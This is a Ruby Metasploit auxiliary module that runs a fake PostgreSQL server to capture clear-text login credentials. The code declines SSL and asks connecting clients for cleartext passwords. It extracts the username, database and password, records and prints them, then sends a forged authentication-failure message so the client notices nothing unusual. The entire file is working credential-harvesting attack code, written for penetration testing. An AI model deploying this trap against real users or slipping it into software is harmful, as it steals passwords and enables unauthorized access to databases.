##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Authentication Capture: PostgreSQL',
      'Description'    => %q{
        This module provides a fake PostgreSQL service that is designed to
        capture clear-text authentication credentials.},
      'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
      'License'        => MSF_LICENSE,
      'Actions'        => [ [ 'Capture' ] ],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ]),
      ])
  end

  # This module is based on MySQL capture module by Patrik Karlsson.
  # Reference: http://www.postgresql.org/docs/9.2/static/protocol-message-formats.html

  def setup
    super
    @state = {}
  end

  def run
    exploit()
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_connect(c)
    @state[c] = {
      :name    => "#{c.peerhost}:#{c.peerport}",
      :ip      => c.peerhost,
      :port    => c.peerport,
    }
    @state[c]["status"] = :init
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    length = data.slice(0, 4).unpack("N")[0]
    if length == 8 and @state[c]["status"] == :init
      # SSL request
      c.put 'N'
      @state[c]["status"] = :send_auth_type
    elsif @state[c]["status"] == :send_auth_type
      # Startup message
      data.slice!(0, 4).unpack("N")[0] # skip over length
      data.slice!(0, 4).unpack("N")[0] # skip over protocol
      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack("C*")
      c.put sdata
      data.slice!(0, 5) # skip over "user\x00"
      @state[c][:username] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      data.slice!(0, 9) # skip over "database\x00"
      @state[c][:database] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      @state[c]["status"] = :pwn
    elsif @state[c]["status"] == :pwn and data[0] == 'p'
      # Password message
      data.slice!(0, 5).unpack("N")[0] # skip over length
      @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
      report_cred(
        ip: c.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'psql_client',
        user: @state[c][:username],
        password: @state[c][:password],
        proof: @state[c][:database]
      )
      print_good("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
      # send failure message
      sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack("CN")
      sdata << "SFATAL"
      sdata << "\x00"
      sdata << "C28P01"
      sdata << "\x00"
      sdata << "Mpassword authentication failed for user \"#{@state[c][:username]}\""
      sdata << "\x00"
      sdata << "Fauth.c"
      sdata << "\x00"
      sdata << "L302"
      sdata << "\x00"
      sdata << "Rauth_failed"
      sdata << "\x00\x00"
      c.put sdata
      c.close
    end

  end

  def on_client_close(c)
    @state.delete(c)
  end
end
